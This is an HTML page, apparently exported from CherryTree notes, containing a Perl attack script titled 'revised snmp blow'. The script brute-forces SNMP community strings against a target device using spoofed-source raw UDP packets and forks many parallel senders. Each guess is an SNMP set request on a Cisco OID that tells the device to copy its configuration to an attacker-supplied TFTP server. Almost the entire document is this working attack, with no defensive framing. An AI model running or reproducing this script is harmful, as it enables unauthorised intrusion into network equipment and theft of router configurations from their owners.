<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>script</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">script</h1><br/>#!/usr/bin/perl<br />#revised snmp blow<br />#peanuter@gmail.com<br />     <br />    use Net::SNMP;<br />    use Data::Dumper;<br />    use Getopt::Std;<br />    use Net::RawIP;<br />     <br />     <br />    $alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";<br />    #            "`~!@#\$%^&amp;*()-_=+[{]}\\|;:'\",&lt;.&gt;/?";<br />    sub usage() { printf STDERR "Usage: $0 -s srcipaddr [-S srcport] -d dstipaddr [-D dstport] -t tftpsipaddr -f cfgfilename -q startpasswd -T forks\n"; exit(1); };<br />     <br />    my %opts;<br />    getopts('s:d:t:f:S:D:q:T:', \%opts);<br />     <br />    my $sport = $opts{'S'} || 161;<br />    my $dstip = $opts{'d'} || usage();<br />    my $dport = $opts{'D'} || 161;<br />    my $srcip = $opts{'s'} || usage();<br />    my $tftpserver = $opts{'t'} || usage();<br />    my $max_processes = $opts{'T'} || usage();<br />    my $filename = $opts{'f'} || usage();<br />    my $startPWD = $opts{'q'} || usage();<br />     <br />    my $security = new Net::SNMP::Security();<br />    my $transport = new Net::SNMP::Transport(-domain =&gt; 'udp4');<br />    my $pdu = new Net::SNMP::PDU(-security =&gt; $security, -transport =&gt; $transport, -requestid =&gt; 0x12345678);<br />    my $packet = new Net::RawIP({ ip =&gt; {tos =&gt; 0, saddr =&gt; $srcip, daddr =&gt; $dstip, protocol =&gt; 17}, udp =&gt; {source =&gt; $sport, dest =&gt; $dport}});<br />     <br />    print "Attempts:\n";<br />            for ($neat = 1;$neat = $neat; ++$neat) {<br />            {<br />    #       print "$neat\r";<br />            $temp_pass = bruteforce($alphabet, $startPWD);<br />    print "$temp_pass\n";<br />    #       if ($count &gt; 20) { print "$temp_pass\n"; $count = ''; }      <br />    #       ++$count;<br />            my $pid;<br />            $pid=fork();<br />            if($pid&gt;0){<br />                    $npids++;<br />                    #print " Processes are: $npids\n" ;<br />                    if($npids&gt;=$max_processes){<br />                            for(1..($max_processes)){<br />                                    my $wait_ret=wait();<br />                                    if($wait_ret&gt;0){<br />                                            $npids--;<br />                                    }<br />                            }<br />                    }<br />                    next;<br />            }elsif(undef $pid){<br />                    print " Fork error!\n";<br />                    exit(0);<br />            }else{<br />                    local $SIG{'ALRM'} = sub { exit(0); };<br />                    alarm 0;<br />     <br />            eval {<br />          <br />            select(undef, undef, undef, 0.25);     <br />     <br />     <br />     <br />            $security-&gt;_community($temp_pass);<br />            #$pdu-&gt;_create_request_id();<br />            $pdu-&gt;prepare_set_request([".1.3.6.1.4.1.9.2.1.55.$tftpserver", OCTET_STRING, $filename]);<br />     <br />            my ($msg, $error) = Net::SNMP::Message-&gt;new(<br />                    -callback   =&gt; $pdu-&gt;callback,<br />                    -leadingdot =&gt; $pdu-&gt;leading_dot,<br />                    -requestid  =&gt; $pdu-&gt;request_id,<br />                    -security   =&gt; $pdu-&gt;security,<br />                    -translate  =&gt; $pdu-&gt;translate,<br />                    -transport  =&gt; $pdu-&gt;transport,<br />                    -version    =&gt; $pdu-&gt;version<br />            );<br />            $security-&gt;generate_request_msg($pdu, $msg);<br />            $packet-&gt;set({udp =&gt; {data =&gt; $msg-&gt;{_buffer}}});<br />            $packet-&gt;send();<br />            };<br />     <br />     <br />                    exit(0);<br />            }<br />    }<br />     <br />    sub bruteforce {<br />      @tmpPWD = ();<br />     <br />      ($ab,$startPWD) = (shift,shift);<br />      $firstChar = substr($ab, 0, 1);<br />      $lastChar = substr($ab, length($ab) - 1, 1);<br />     <br />      if ($startPWD ne "" &amp;&amp; $currentPWD eq "") {<br />        $currentPWD = $startPWD;<br />        return $currentPWD;<br />      }<br />      <br />      if ($currentPWD eq "") {<br />        $currentPWD = $firstChar;<br />        return $currentPWD;<br />      }<br />     <br />      if ($currentPWD eq fillString(length($currentPWD), $lastChar)) {<br />        $currentPWD = fillString(length($currentPWD) + 1, $firstChar);<br />        return $currentPWD;<br />      }<br />     <br />      # convert the password to an array<br />      @tmpPWD = split(//, $currentPWD);<br />     <br />      $x = @tmpPWD - 1;<br />      <br />      while (1) {<br />        $iTemp = getPos($ab, $tmpPWD[$x]);<br />     <br />        if ($iTemp == getPos($ab, $lastChar)) {<br />          @tmpPWD[$x] = $firstChar;<br />          $x--;<br />        } else {<br />      <br />          @tmpPWD[$x] = substr($ab, $iTemp + 1, 1);<br />          last;<br />        }<br />      }<br />     <br />      $currentPWD = join("", @tmpPWD);<br />      <br />      return $currentPWD;<br />    }<br />     <br />    sub fillString {<br />      my ($len, $char) = (shift, shift);<br />      $str = "";<br />      for ($i=0; $i&lt;$len; $i++) {<br />        $str .= $char;<br />      }<br />      return $str;<br />    }<br />     <br />    sub getPos {<br />      my ($ab, $char) = (shift, shift);<br />      for ($i=0; $i&lt;length($ab); $i++) {<br />        if ($char eq substr($ab, $i, 1)) {<br />          return $i;<br />        }<br />    }<br />}<br />}<br /></div></body></html>